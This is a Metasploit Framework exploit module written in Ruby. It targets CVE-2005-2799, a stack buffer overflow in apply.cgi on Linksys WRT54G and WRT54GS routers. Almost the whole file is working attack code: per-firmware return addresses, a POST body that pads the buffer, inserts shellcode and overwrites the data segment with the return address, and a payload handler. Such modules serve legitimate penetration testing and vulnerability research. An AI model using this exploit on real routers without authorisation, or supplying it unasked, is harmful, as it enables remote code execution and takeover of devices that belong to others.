##
# $Id: linksys_apply_cgi.rb 10457 2010-09-24 16:55:38Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Linksys WRT54 Access Point apply.cgi Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in apply.cgi on the Linksys WRT54G and WRT54GS routers.
				According to iDefense who discovered this vulnerability, all WRT54G versions prior to
				4.20.7 and all WRT54GS version prior to 1.05.2 may be be affected.
			},
			'Author'         => [ 'Raphael Rigo <devel-metasploit[at]syscall.eu>', 'Julien Tinnes <julien[at]cr0.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10457 $',
			'References'     =>
				[
					[ 'CVE', '2005-2799'],
					[ 'OSVDB', '19389' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],
				],
			'Payload'        =>
				{
					#'BadChars' => "\x00",
					'Space'    => 10000,
					'DisableNops' => true,
				},
			'Arch'		 => ARCH_MIPSLE,
			'Platform'       => 'linux',
			'Targets'        =>
				[
					# the middle of the intersection is our generic address
					#((addrs.map { |n, h| [h["Bufaddr"],n] }.max[0] + addrs.map { |n, h| [h["Bufaddr"],n] }.min[0]+9500)/2).to_s(16)
					[ 'Generic', { 'Bufaddr' => 0x10002b50}],
					[ 'Version 1.42.2', { 'Bufaddr' => 0x100016a8 }],
					[ 'Version 2.02.6beta1', { 'Bufaddr' => 0x10001760 }],
					[ 'Version 2.02.7_ETSI', { 'Bufaddr' => 0x10001634 }],
					[ 'Version 3.03.6', { 'Bufaddr' => 0x10001830 }],
					[ 'Version 4.00.7', { 'Bufaddr' => 0x10001AD8 }],
					[ 'Version 4.20.06', { 'Bufaddr' => 0x10001B50 }],
				],
			'DisclosureDate' => 'Sep 13 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(80),
				Opt::RHOST('192.168.1.1')
			], self.class)
	end

	# Approx size of the remaining space in the data segment after our buffer
	DataSegSize = 0x4000

	def exploit
		c = connect

		print_status("Return address at 0x#{target['Bufaddr'].to_s(16)}")
		print_status("Shellcode length: #{payload.encoded.length}")

		addr = [target['Bufaddr']].pack('V')

#		original = "Cache-Control: no-cache\r\nPragma: no-cache\r\nExpires: 0\x00\x00\x00"
#		original += "\x10\xAD\x43\x00\x18\xAD\x43\x00\x70\x3e\x00\x10\x00\x00\x00\x00"
#		            Pointers in 2.02.6beta1


#		 | BIG BUFFER  | Various structs and function pointers | ... | .ctors | .dtors | ... | .got |
#		 | <- 10000 -> | **************************** Pad with return address ***********************
#		 I know this is horrible :( - On the other side this is very generic :)
		post_data = "\x00"*(10000-payload.encoded.length)+payload.encoded+addr*(DataSegSize/4)

		#post_data = "\x00"*(10000-payload.encoded.length)+payload.encoded+original+addr*2#+"\x24\xad\x43"

#	        res = send_request_cgi({ 'uri' => "/apply.cgi",
#				  'method' => 'POST',
#				  'data' => post_data });
#		print_status("Malicious request sent, do_ej should be overwritten")

		req = c.request_cgi({ 'uri' => "/apply.cgi",
			'method' => 'POST',
			'data' => post_data
		})
		c.send_request(req)
		print_status("Mayhem sent")


#		req=c.request_cgi('uri' => '/');
#		c.send_request(req);
#		print_status("do_ej triggered")

		handler
		disconnect
	end

end